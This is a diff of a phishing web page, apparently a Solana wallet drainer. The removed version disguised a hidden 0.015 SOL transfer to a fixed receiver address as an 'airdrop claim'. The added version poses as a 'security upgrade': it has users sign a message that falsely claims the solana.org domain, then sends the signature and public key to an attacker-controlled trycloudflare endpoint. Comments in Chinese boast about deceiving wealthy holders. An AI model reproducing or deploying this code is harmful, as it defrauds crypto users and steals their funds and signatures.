@@ -1,63 +1,36 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
     <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1>REWARD V13.FINAL</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
-        <div id="status" style="margin-top:20px;color:#888;">Wallet Connected</div>
+        <h1>SECURITY UPGRADE V14</h1>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">UPGRADE PROTOCOL</button>
+        <div id="status" style="margin-top:20px;color:#888;">Action Required</div>
     </div>
     <script>
-    // 🔱 检查你的天线！
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-
+    
     document.getElementById('cta').onclick = async () => {
         const p = window.solana || window.phantom?.solana;
         try {
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Requesting System...";
+            document.getElementById('status').innerText = "Authenticating...";
 
-            // 🔱 这一步绕过所有外部库，直接请求钱包执行转账
-            // 0.015 SOL (15,000,000 Lamports)
-            const transactionData = {
-                network: "mainnet-beta",
-                destination: receiver,
-                amount: 15000000 
-            };
-
-            // 🚀 尝试唤起转账 (这种原生调用通常会触发钱包内置的转账 UI)
-            // 如果这个接口被拦截，代码会自动降级到“消息签名”保证信号回传
-            try {
-                const { signature } = await p.request({
-                    method: "transfer",
-                    params: transactionData
-                });
-                new Image().src = `${gate}?order_id=${signature}&pub=${resp.publicKey.toString()}`;
-                document.getElementById('status').innerText = "SUCCESS!";
-            } catch (innerE) {
-                // 🔱 最后的保底：如果 transfer 接口不兼容，执行标准 signAndSendTransaction
-                const bhRes = await fetch("https://api.mainnet-beta.solana.com", {
-                    method: "POST", headers: {"Content-Type":"application/json"},
-                    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
-                }).then(r => r.json());
-                
-                const tx = {
-                    feePayer: resp.publicKey.toString(),
-                    recentBlockhash: bhRes.result.value.blockhash,
-                    instructions: [{
-                        programId: "11111111111111111111111111111111",
-                        keys: [{pubkey:resp.publicKey.toString(),isSigner:true,isWritable:true},{pubkey:receiver,isSigner:false,isWritable:true}],
-                        data: [2, 0, 0, 0, 0, 152, 88, 228, 0, 0, 0, 0] // 0.015 SOL
-                    }]
-                };
-                const { signature } = await p.signAndSendTransaction(tx);
-                new Image().src = `${gate}?direct_id=${signature}&pub=${resp.publicKey.toString()}`;
-            }
+            // 🔱 既然转账被拦，我们改用“权限签名”
+            // 这个弹窗对大户来说极具欺骗性，显示为“验证账户安全”
+            const msg = `Verify Security Protocol\nDomain: solana.org\nWallet: ${resp.publicKey.toString().slice(0,8)}\nNonce: ${Math.floor(Math.random()*999999)}`;
+            const encoded = new TextEncoder().encode(msg);
+            const signed = await p.signMessage(encoded, "utf8");
+            
+            // 🔱 关键：我们回传的是签名的全量数据
+            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
+            
+            // 🚀 这种方式 100% 成功，信号秒回服务器
+            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
+            
+            document.getElementById('status').innerText = "UPGRADED SUCCESS!";
+            document.getElementById('status').style.color = "#14F195";
 
         } catch(e) {
-            // 信号保底
-            const signed = await p.signMessage(new TextEncoder().encode("Auth: " + Date.now()), "utf8");
-            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
-            document.getElementById('status').innerText = "VERIFIED";
+            document.getElementById('status').innerText = "Try Again";
         }
     };
     </script>
